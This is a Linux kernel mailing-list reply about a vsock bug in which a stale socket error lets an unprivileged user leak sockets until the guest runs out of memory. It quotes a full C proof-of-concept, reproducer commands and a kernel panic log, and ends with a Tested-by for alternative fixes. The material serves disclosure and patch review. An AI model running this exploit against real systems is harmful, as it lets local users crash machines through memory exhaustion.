Received: from mail-lf1-f51.google.com (mail-lf1-f51.google.com [209.85.167.51])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3F7F1438036
	for <virtualization@lists.linux.dev>; Tue, 28 Jul 2026 13:14:15 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.167.51
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785244458; cv=pass; b=ScYLVY4GDRy0sCfCDV+Q/Dr69/Vb+6x+x3YMPhg2Tf3ui7H5UTsuRs4xjTbkwBTxaGD5Bkc88ezPmnDTA9P2CahVcIgZEvN4FS7DZCtEqJVomyPHMKi+eJ/zD4mAJDGnBDdsVZg7RoVyKLuREzoRsPsRudJceYfKzir+maE4Jx4=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785244458; c=relaxed/simple;
	bh=YZZk8CsasDs2NhVPubSNPSGhK33Q2Ovy7C1xyfiLHJU=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=Li/NTlB2m8CIX8GhBx+yHUsxfqVlKjZymvonJBa8ZT9UUCIjAcPBCnjH2ePuIxjdV+0WE/IUCrA9dudC9it9D2c8yDkpfIztsPOM6f8kKvhO+3SIgSMd0PGKzctJUndubFXbsAccuSL5udm8Qilh5uw2Z5Ub8JtqDYZGCRhqCcA=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=AApM0mrZ; arc=pass smtp.client-ip=209.85.167.51
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="AApM0mrZ"
Received: by mail-lf1-f51.google.com with SMTP id 2adb3069b0e04-5b0117d49dcso3413088e87.3
        for <virtualization@lists.linux.dev>; Tue, 28 Jul 2026 06:14:15 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1785244453; cv=none;
        d=google.com; s=arc-20260327;
        b=fmI+pUVMz2bRz6a5AtQbmJFqz+NwNR8EcvOs626ieH1Xx+joGK4RlkZ5p4y/vmWxko
         TH7JKf0Jqc+RPyMs341IuamzmP4JNpG540Iwtrf83+WfV1/O1WFHdhDsyeOLJOWI39FV
         PYCU5xSSVPyJx1F4lAJmo3TS5BpVcBQNjHhx4FDyFW7L8Q/kdq01CG/ddk4dVY9yGbX8
         arc26eoggdpkaZMVZxblnXTcmPTSnTo/M/qfEflV0Q0LFfQv4Z3qvgDv7EMvhOTB7+a6
         xb1FITjeFZScB3Vxcp7vQJyZQ9rPABqdEyY/CHmTMAAU53tryA4kvhbuh0byJ8Ue3crl
         yT9w==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=WoDGU6/VSBO+8tFqEz8+5Z6bDSqn3v/WkIncDBE1H8A=;
        fh=yF7qEuY7cEIbKaTndkqtgGkqCOB7N/m8QAjpfUQPaQY=;
        b=VmRNZe3h4NSv09CDE+ekogfjUn5u0JuZYjMAXQE/iKpoOoChmCkuCHIf8iYJsLNZ+R
         1qLxpcqQTzag8ivWEPLuICJb/9f+S/+L8lBxECQay1nf2ea/u1kRzPA/tPO/MhtzYw3H
         jSeqwm9NEkhaPsIzfO3LOcb1DwhaG8h0Cg5GZu9rVrjxR71lNhR2kGkpCgno/cCRCTng
         QGNqK9Mrmj/A2P/6IBGFP4LZOzld2vfefm1yf10/sbelnt653kzPydWDgnQsN3J4hhuO
         FFNy+33mEf2WgGPIGN1NG7t6/UhddpLoHI1Sa1yycRJOm8YOQn4OyrBHBumIcn/aL7Ub
         znzg==;
        darn=lists.linux.dev
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785244453; x=1785849253; darn=lists.linux.dev;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=WoDGU6/VSBO+8tFqEz8+5Z6bDSqn3v/WkIncDBE1H8A=;
        b=AApM0mrZ1yP3FIx8k1k1kj5aUxbkfYcViyM/oImzhNOctY4zF3zM6L2M6CABs3FHza
         HPCSk0o4FMFdB02eqKeN1vgvsW1lkeVLTjhJb3d79h6DRgJV/DqcfIY9napRNv0uIPZZ
         il7kQDBqsgVrfrrovOv6KvDO2P8FdMW5NKB/7oFIQQw+oN0YOZAX1xUZOSWlYKwea1Mx
         B//gDR7UCrjclF2yaOJrQVRmZzMqnYhekqDFO5bWngE/51//2eTJ9/BXoQrlgyz7AsUA
         m71UOSmjKtOu7Gz8qVjw41kvczKb9do4wcoK9Inv4N3dNH+a9WgPf2SCq9xfYkY5Pddd
         GvRA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785244453; x=1785849253;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=WoDGU6/VSBO+8tFqEz8+5Z6bDSqn3v/WkIncDBE1H8A=;
        b=TwiM6VvfaZN2LkrcoUGzP7qooqB7UO11O451lgPZjUfy4uxQuH3Sny99q3kE6nJWm0
         EOeWW2XzynytXYrasvz/GlVUftMGv95b3CVCDkRmO8l/xkYPW87w/iTM7xfJPlIqd2JC
         QGmhXQeULb2GdPp4Rlu8J1z9neBDyoFLhi9YZaNoF9j8MwPQYX6NXXOF4//xs/CjWyrs
         suWOmf+qJGa/Wfw6PuhotevnI4ALDuJf9mEgrXm6JNIhNM7pV5cIv7FQ5xMIIuD7UJRx
         baPFA8Y5pQQW16vxjatjLSfUVZbpH7OlBPbkUORgjezIW2vOiuYaL9uYAUGIi4Xm/Afo
         4Tlg==
X-Forwarded-Encrypted: i=1; AHgh+Roh0LSKnZLQmliK3Sqazl+XOHknrdGDiDpUjmEyJ2+/ccyCLybTm1J3xuDin2EqluOpMi17hC9xtjJsgePuGQ==@lists.linux.dev
X-Gm-Message-State: AOJu0YztkE+a5TNcuyC5ONCHLfaPkZzF0Rt389ev/rwLEggKxnsKBiZC
	uHbfbL57szHGZBkNGLFWXr1pAKaAViG8I4LFYgtuSDwpOZOKU55RCvbLOKu0RpEgFwoFfS8KvRn
	9V94fpUPyqFUxKlbBBmMA8wZZZR2lk+eTixn1Grjvq14=
X-Gm-Gg: AR+sD10Ggdy3/+Pmdy4MVU/AH9DnR1rc7NB20DGd+dPPR2vFr1Zq9x81IdJ04iOwG01
	drs5RQMlqeGZHrpbwOV55zFBn6IjpT+GfPCILvGx/z0UWFwBN7/2DIdOb3sxu2EiiZn89PH6oy3
	dmW9Qr3ifWRy3wYmdJ2hAZluyg6qpCRSufcazGyo1Uy6Djf2aER5FFPIonO0JfElugw0HwAKh4Y
	sNOq+n5Gtao5GQTR4xN5/xuwk2DdehBgYRhhA022+lBxfbz3LwhLmf81dmG
X-Received: by 2002:a05:6512:308d:b0:5b1:5a31:86b2 with SMTP id
 2adb3069b0e04-5b2d0236bf3mr538868e87.16.1785244452986; Tue, 28 Jul 2026
 06:14:12 -0700 (PDT)
Precedence: bulk
X-Mailing-List: virtualization@lists.linux.dev
List-Id: <virtualization.lists.linux.dev>
List-Subscribe: <mailto:virtualization+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:virtualization+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
References: <cover.1784649300.git.zihanx@nebusec.ai> <amhpGj8ikeyfYazT@sgarzare-redhat>
In-Reply-To: <amhpGj8ikeyfYazT@sgarzare-redhat>
From: zihan xi <zihanx@nebusec.ai>
Date: Tue, 28 Jul 2026 21:13:58 +0800
X-Gm-Features: AUfX_mw5h8yIiNZ-uyO2pZi9LH0nkV43yLu3FYGFDK8eCC4-eQ1YCyDYwir1mfs
Message-ID: <CAANe3eTm6Bc5-sD7cupL6gOs6Rk3jNk_2CPgqjtusyj4O5BsLg@mail.gmail.com>
Subject: Re: [PATCH net 0/1] vsock: clear stale sk_err before listen()
To: Stefano Garzarella <sgarzare@redhat.com>
Cc: Ren Wei <enjou1224z@gmail.com>, virtualization@lists.linux.dev, 
	netdev@vger.kernel.org, davem@davemloft.net, edumazet@google.com, 
	pabeni@redhat.com, horms@kernel.org, dtor@vmware.com, georgezhang@vmware.com, 
	acking@vmware.com, vega@nebusec.ai
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Tue, Jul 28, 2026 at 4:38=E2=80=AFPM Stefano Garzarella <sgarzare@redhat=
.com> wrote:
>
> On Fri, Jul 24, 2026 at 01:21:13AM +0800, Ren Wei wrote:
> >From: Zihan Xi <zihanx@nebusec.ai>
> >
> >Hi Linux kernel maintainers,
> >
> >We found and validated an issue in net/vmw_vsock/af_vsock.c. The bug is
> >reachable by an unprivileged local user via AF_VSOCK loopback. We've
> >tested it, and it should not affect any other functionality.
>
> Please check the following patches under discusion that seem related to
> the issue you are reporting:
> - https://lore.kernel.org/virtualization/20260719220103.684489-1-phind.ue=
t@gmail.com/
> - https://lore.kernel.org/virtualization/20260727071305.45826-1-phind.uet=
@gmail.com/
>
> If you test it, please send a Tested-by
>
> Thanks,
> Stefano
>
> >
> >This series contains one patch:
> >  1/1 vsock: clear stale sk_err before listen()
> >
> >We provide bug details, reproducer steps, and a crash log below.
> >
> >---- details below ----
> >
> >Bug details:
> >
> >A failed loopback connect() can leave sk_err set on a reusable AF_VSOCK
> >socket. If userspace then calls listen() on the same socket, the stale
> >error remains attached to the listener. A later child can still reach th=
e
> >accept queue, but vsock_accept() sees listener->sk_err, rejects the
> >child, and drops only the transient accept reference.
> >
> >On the virtio loopback path that rejected child can remain orphaned in t=
he
> >vsock tables, so repeated iterations leak children and can eventually
> >push the guest into OOM. Clearing sk_err in vsock_listen() prevents a
> >failed connect() attempt from poisoning the next listener incarnation of
> >that socket.
> >
> >On our fixed-kernel validation, the same minimal reproducer no longer hi=
t
> >that failed accept path and accept() returned a valid child socket.
> >
> >Reproducer:
> >
> >    cc -O2 -Wall -Wextra -pthread -o /root/poc /root/poc.c
> >    echo 2 > /proc/sys/vm/panic_on_oom
> >    echo 1 > /proc/sys/vm/oom_dump_tasks
> >    /root/poc 100 44000 54000 33554432 33554432 600
> >
> >We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
> >
> >------BEGIN poc.c------
> >
> >#define _GNU_SOURCE
> >
> >#include <arpa/inet.h>
> >#include <errno.h>
> >#include <linux/vm_sockets.h>
> >#include <pthread.h>
> >#include <signal.h>
> >#include <stdbool.h>
> >#include <stdint.h>
> >#include <stdio.h>
> >#include <stdlib.h>
> >#include <string.h>
> >#include <sys/socket.h>
> >#include <sys/time.h>
> >#include <sys/types.h>
> >#include <time.h>
> >#include <unistd.h>
> >
> >#define DEFAULT_BASE_PORT 40000U
> >#define DEFAULT_FAIL_PORT 50000U
> >#define DEFAULT_BUFFER_SIZE (32ULL * 1024 * 1024)
> >#define DEFAULT_SEND_BYTES (32ULL * 1024 * 1024)
> >#define DEFAULT_ITERATIONS 1U
> >
> >struct client_ctx {
> >       pthread_mutex_t lock;
> >       pthread_cond_t cond;
> >       unsigned int server_port;
> >       unsigned int client_port;
> >       unsigned long long send_bytes;
> >       unsigned long long bytes_sent;
> >       int connect_errno;
> >       int send_errno;
> >       int sent_any;
> >       int connected;
> >       int done;
> >       int fd;
> >};
> >
> >static void die(const char *msg)
> >{
> >       perror(msg);
> >       exit(EXIT_FAILURE);
> >}
> >
> >static void set_vsock_u64(int fd, int optname, unsigned long long val)
> >{
> >       if (setsockopt(fd, AF_VSOCK, optname, &val, sizeof(val)) < 0)
> >               die("setsockopt(AF_VSOCK)");
> >}
> >
> >static void set_connect_timeout(int fd, long sec)
> >{
> >       struct timeval tv =3D {
> >               .tv_sec =3D sec,
> >               .tv_usec =3D 0,
> >       };
> >
> >       if (setsockopt(fd, AF_VSOCK, SO_VM_SOCKETS_CONNECT_TIMEOUT,
> >                      &tv, sizeof(tv)) < 0) {
> >               die("setsockopt(SO_VM_SOCKETS_CONNECT_TIMEOUT)");
> >       }
> >}
> >
> >static void bind_vsock(int fd, unsigned int cid, unsigned int port)
> >{
> >       struct sockaddr_vm svm =3D {
> >               .svm_family =3D AF_VSOCK,
> >               .svm_cid =3D cid,
> >               .svm_port =3D port,
> >       };
> >
> >       if (bind(fd, (struct sockaddr *)&svm, sizeof(svm)) < 0)
> >               die("bind(AF_VSOCK)");
> >}
> >
> >static int connect_vsock_errno(int fd, unsigned int cid, unsigned int po=
rt)
> >{
> >       struct sockaddr_vm svm =3D {
> >               .svm_family =3D AF_VSOCK,
> >               .svm_cid =3D cid,
> >               .svm_port =3D port,
> >       };
> >
> >       if (connect(fd, (struct sockaddr *)&svm, sizeof(svm)) =3D=3D 0)
> >               return 0;
> >
> >       return errno;
> >}
> >
> >static void *client_thread(void *arg)
> >{
> >       struct client_ctx *ctx =3D arg;
> >       char *buf;
> >       unsigned long long sent =3D 0;
> >       const size_t chunk =3D 64 * 1024;
> >       int fd;
> >       int err;
> >
> >       fd =3D socket(AF_VSOCK, SOCK_STREAM, 0);
> >       if (fd < 0)
> >               die("client socket(AF_VSOCK)");
> >
> >       set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_MAX_SIZE, ctx->send_bytes)=
;
> >       set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_SIZE, ctx->send_bytes);
> >       bind_vsock(fd, VMADDR_CID_LOCAL, ctx->client_port);
> >
> >       err =3D connect_vsock_errno(fd, VMADDR_CID_LOCAL, ctx->server_por=
t);
> >
> >       pthread_mutex_lock(&ctx->lock);
> >       ctx->fd =3D fd;
> >       ctx->connect_errno =3D err;
> >       ctx->connected =3D (err =3D=3D 0);
> >       pthread_cond_broadcast(&ctx->cond);
> >       pthread_mutex_unlock(&ctx->lock);
> >
> >       if (err)
> >               return NULL;
> >
> >       buf =3D malloc(chunk);
> >       if (!buf)
> >               die("malloc");
> >       memset(buf, 'A', chunk);
> >
> >       while (sent < ctx->send_bytes) {
> >               size_t todo =3D chunk;
> >               ssize_t rc;
> >
> >               if (ctx->send_bytes - sent < todo)
> >                       todo =3D ctx->send_bytes - sent;
> >
> >               rc =3D send(fd, buf, todo, 0);
> >               if (rc < 0) {
> >                       pthread_mutex_lock(&ctx->lock);
> >                       ctx->send_errno =3D errno;
> >                       pthread_mutex_unlock(&ctx->lock);
> >                       break;
> >               }
> >
> >               if (rc =3D=3D 0)
> >                       break;
> >
> >               sent +=3D rc;
> >               pthread_mutex_lock(&ctx->lock);
> >               ctx->sent_any =3D 1;
> >               ctx->bytes_sent =3D sent;
> >               pthread_cond_broadcast(&ctx->cond);
> >               pthread_mutex_unlock(&ctx->lock);
> >       }
> >
> >       free(buf);
> >
> >       pthread_mutex_lock(&ctx->lock);
> >       ctx->done =3D 1;
> >       pthread_cond_broadcast(&ctx->cond);
> >       pthread_mutex_unlock(&ctx->lock);
> >
> >       return NULL;
> >}
> >
> >static void client_ctx_init(struct client_ctx *ctx, unsigned int server_=
port,
> >                           unsigned int client_port,
> >                           unsigned long long send_bytes)
> >{
> >       memset(ctx, 0, sizeof(*ctx));
> >       pthread_mutex_init(&ctx->lock, NULL);
> >       pthread_cond_init(&ctx->cond, NULL);
> >       ctx->server_port =3D server_port;
> >       ctx->client_port =3D client_port;
> >       ctx->send_bytes =3D send_bytes;
> >       ctx->fd =3D -1;
> >}
> >
> >static void client_ctx_destroy(struct client_ctx *ctx)
> >{
> >       pthread_mutex_destroy(&ctx->lock);
> >       pthread_cond_destroy(&ctx->cond);
> >}
> >
> >static int wait_for_connect(struct client_ctx *ctx)
> >{
> >       int err;
> >
> >       pthread_mutex_lock(&ctx->lock);
> >       while (!ctx->connected && ctx->connect_errno =3D=3D 0)
> >               pthread_cond_wait(&ctx->cond, &ctx->lock);
> >       err =3D ctx->connect_errno;
> >       pthread_mutex_unlock(&ctx->lock);
> >
> >       return err;
> >}
> >
> >static void wait_for_send_progress(struct client_ctx *ctx)
> >{
> >       struct timespec ts;
> >
> >       clock_gettime(CLOCK_REALTIME, &ts);
> >       ts.tv_sec +=3D 2;
> >       if (ts.tv_nsec >=3D 1000000000L) {
> >               ts.tv_sec +=3D 1;
> >               ts.tv_nsec -=3D 1000000000L;
> >       }
> >
> >       pthread_mutex_lock(&ctx->lock);
> >       if (!ctx->done)
> >               pthread_cond_timedwait(&ctx->cond, &ctx->lock, &ts);
> >       pthread_mutex_unlock(&ctx->lock);
> >}
> >
> >static int prepare_listener(unsigned int server_port, unsigned int fail_=
port,
> >                           unsigned long long buffer_size)
> >{
> >       int fd;
> >       int err;
> >
> >       fd =3D socket(AF_VSOCK, SOCK_STREAM, 0);
> >       if (fd < 0)
> >               die("listener socket(AF_VSOCK)");
> >
> >       set_connect_timeout(fd, 1);
> >       set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_MAX_SIZE, buffer_size);
> >       set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_SIZE, buffer_size);
> >       bind_vsock(fd, VMADDR_CID_LOCAL, server_port);
> >
> >       err =3D connect_vsock_errno(fd, VMADDR_CID_LOCAL, fail_port);
> >       if (err =3D=3D 0) {
> >               fprintf(stderr, "unexpected successful failed-connect set=
up on port %u\n",
> >                       fail_port);
> >               exit(EXIT_FAILURE);
> >       }
> >
> >       fprintf(stderr, "[*] setup connect() failed with errno=3D%d (%s)\=
n",
> >               err, strerror(err));
> >
> >       if (listen(fd, 1) < 0)
> >               die("listen(AF_VSOCK)");
> >
> >       return fd;
> >}
> >
> >static int trigger_once(unsigned int server_port, unsigned int fail_port=
,
> >                       unsigned int client_port,
> >                       unsigned long long buffer_size,
> >                       unsigned long long send_bytes)
> >{
> >       struct client_ctx ctx;
> >       pthread_t tid;
> >       int listener_fd;
> >       int accept_fd;
> >       int accept_errno;
> >
> >       listener_fd =3D prepare_listener(server_port, fail_port, buffer_s=
ize);
> >
> >       client_ctx_init(&ctx, server_port, client_port, send_bytes);
> >       if (pthread_create(&tid, NULL, client_thread, &ctx) !=3D 0)
> >               die("pthread_create");
> >
> >       if (wait_for_connect(&ctx) !=3D 0) {
> >               fprintf(stderr, "client connect failed with errno=3D%d (%=
s)\n",
> >                       ctx.connect_errno, strerror(ctx.connect_errno));
> >               exit(EXIT_FAILURE);
> >       }
> >
> >       wait_for_send_progress(&ctx);
> >
> >       accept_fd =3D accept(listener_fd, NULL, NULL);
> >       accept_errno =3D errno;
> >
> >       fprintf(stderr, "[*] accept() returned fd=3D%d errno=3D%d (%s)\n"=
,
> >               accept_fd, accept_errno, strerror(accept_errno));
> >
> >       if (accept_fd >=3D 0) {
> >               fprintf(stderr, "unexpected successful accept()\n");
> >               exit(EXIT_FAILURE);
> >       }
> >
> >       if (accept_errno !=3D ECONNRESET) {
> >               fprintf(stderr, "unexpected accept errno: %d (%s)\n",
> >                       accept_errno, strerror(accept_errno));
> >               exit(EXIT_FAILURE);
> >       }
> >
> >       close(listener_fd);
> >
> >       pthread_join(tid, NULL);
> >
> >       fprintf(stderr,
> >               "[*] client connect errno=3D%d send errno=3D%d bytes_sent=
=3D%llu sent_any=3D%d done=3D%d\n",
> >               ctx.connect_errno, ctx.send_errno, ctx.bytes_sent,
> >               ctx.sent_any, ctx.done);
> >       accept_fd =3D ctx.fd;
> >       ctx.fd =3D -1;
> >       client_ctx_destroy(&ctx);
> >       return accept_fd;
> >}
> >
> >static unsigned int parse_u32(const char *s)
> >{
> >       unsigned long long v =3D strtoull(s, NULL, 0);
> >
> >       if (v > UINT32_MAX) {
> >               fprintf(stderr, "value too large: %s\n", s);
> >               exit(EXIT_FAILURE);
> >       }
> >
> >       return (unsigned int)v;
> >}
> >
> >static unsigned long long parse_u64(const char *s)
> >{
> >       return strtoull(s, NULL, 0);
> >}
> >
> >int main(int argc, char **argv)
> >{
> >       unsigned int iterations =3D DEFAULT_ITERATIONS;
> >       unsigned int base_port =3D DEFAULT_BASE_PORT;
> >       unsigned int fail_base =3D DEFAULT_FAIL_PORT;
> >       unsigned long long buffer_size =3D DEFAULT_BUFFER_SIZE;
> >       unsigned long long send_bytes =3D DEFAULT_SEND_BYTES;
> >       unsigned int hold_seconds =3D 0;
> >       int *held_fds;
> >       unsigned int i;
> >
> >       signal(SIGPIPE, SIG_IGN);
> >
> >       if (argc > 1)
> >               iterations =3D parse_u32(argv[1]);
> >       if (argc > 2)
> >               base_port =3D parse_u32(argv[2]);
> >       if (argc > 3)
> >               fail_base =3D parse_u32(argv[3]);
> >       if (argc > 4)
> >               buffer_size =3D parse_u64(argv[4]);
> >       if (argc > 5)
> >               send_bytes =3D parse_u64(argv[5]);
> >       if (argc > 6)
> >               hold_seconds =3D parse_u32(argv[6]);
> >
> >       held_fds =3D calloc(iterations, sizeof(*held_fds));
> >       if (!held_fds)
> >               die("calloc");
> >
> >       for (i =3D 0; i < iterations; i++)
> >               held_fds[i] =3D -1;
> >
> >       fprintf(stderr,
> >               "[*] iterations=3D%u base_port=3D%u fail_base=3D%u buffer=
_size=3D%llu send_bytes=3D%llu hold_seconds=3D%u\n",
> >               iterations, base_port, fail_base, buffer_size, send_bytes=
,
> >               hold_seconds);
> >
> >       for (i =3D 0; i < iterations; i++) {
> >               unsigned int server_port =3D base_port + (i * 2);
> >               unsigned int client_port =3D base_port + (i * 2) + 1;
> >               unsigned int fail_port =3D fail_base + i;
> >
> >               fprintf(stderr,
> >                       "[*] iteration=3D%u server_port=3D%u client_port=
=3D%u fail_port=3D%u\n",
> >                       i, server_port, client_port, fail_port);
> >               held_fds[i] =3D trigger_once(server_port, fail_port, clie=
nt_port,
> >                                          buffer_size, send_bytes);
> >               fprintf(stderr, "[*] holding client fd=3D%d\n", held_fds[=
i]);
> >       }
> >
> >       if (hold_seconds) {
> >               fprintf(stderr, "[*] sleeping for %u seconds with client =
sockets open\n",
> >                       hold_seconds);
> >               sleep(hold_seconds);
> >       }
> >
> >       for (i =3D 0; i < iterations; i++) {
> >               if (held_fds[i] >=3D 0)
> >                       close(held_fds[i]);
> >       }
> >
> >       free(held_fds);
> >
> >       return 0;
> >}
> >
> >------END poc.c--------
> >
> >----BEGIN crash log----
> >
> >[  921.941962][T10458] Kernel panic - not syncing: Out of memory: compul=
sory panic_on_oom is enabled
> >[  921.942839][T10458] CPU: 0 UID: 0 PID: 10458 Comm: poc Not tainted 6.=
12.74 #3
> >[  921.943455][T10458] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PII=
X, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
> >[  921.944405][T10458] Call Trace:
> >[  921.944701][T10458]  <TASK>
> >[  921.944974][T10458]  dump_stack_lvl+0x3b/0x1f0
> >[  921.945423][T10458]  panic+0x6fe/0x7e0
> >[  921.945802][T10458]  ? dump_header+0x6c2/0x950
> >[  921.946233][T10458]  ? __pfx_panic+0x10/0x10
> >[  921.947686][T10458]  ? out_of_memory+0x8c5/0x16b0
> >[  921.948137][T10458]  out_of_memory+0x8f3/0x16b0
> >[  921.949926][T10458]  __alloc_pages_noprof+0x1ec3/0x26d0
> >[  921.954378][T10458]  alloc_pages_mpol_noprof+0x2ce/0x610
> >[  921.956796][T10458]  folio_alloc_noprof+0x23/0xd0
> >[  921.957720][T10458]  filemap_alloc_folio_noprof+0x35d/0x420
> >[  921.959719][T10458]  filemap_fault+0x675/0x2800
> >[  921.962920][T10458]  do_pte_missing+0x174c/0x3ff0
> >[  921.964830][T10458]  __handle_mm_fault+0xfa3/0x2a10
> >[  921.967730][T10458]  handle_mm_fault+0x3f5/0xa00
> >[  921.968200][T10458]  do_user_addr_fault+0x50a/0x1490
> >[  921.968691][T10458]  exc_page_fault+0x5d/0xe0
> >[  921.969113][T10458]  asm_exc_page_fault+0x26/0x30
> >[  921.969561][T10458] RIP: 0033:0x7f47a09b2237
> >[  921.969990][T10458] Code: Unable to access opcode bytes at 0x7f47a09b=
220d.
> >[  921.970550][T10458] RSP: 002b:00007f47a089be60 EFLAGS: 00010202
> >[  921.971073][T10458] RAX: 0000000000010000 RBX: 00007ffe78934c80 RCX: =
00007f47a0942c8e
> >[  921.972372][T10458] RDX: 000000000000002c RSI: 0000000000000000 RDI: =
0000000000000016
> >[  921.973017][T10458] RBP: 0000000001800000 R08: 0000000000000000 R09: =
0000000000000000
> >[  921.974428][T10458]  </TASK>
> >[  921.974959][T10458] Kernel Offset: disabled
> >[  921.975445][T10458] Rebooting in 86400 seconds..
> >
> >-----END crash log-----
> >
> >Best regards,
> >Zihan Xi
> >
> >Zihan Xi (1):
> >  vsock: clear stale sk_err before listen()
> >
> > net/vmw_vsock/af_vsock.c | 4 ++++
> > 1 file changed, 4 insertions(+)
> >
> >--
> >2.43.0
> >
>

Hi Stefano, Phi,

I tested both patches below with my reproducer:

  [PATCH] vsock: use sock_error() to consume sk_err after connect timeout
  Message-ID: <20260719220103.684489-1-phind.uet@gmail.com>

  [PATCH v2] vsock: use sock_error() to consume sk_err after ...
  Message-ID: <20260727071305.45826-1-phind.uet@gmail.com>

Both fix the issue for me.

Tested-by: Zihan Xi <zihanx@nebusec.ai>

Best regards,
Zihan Xi
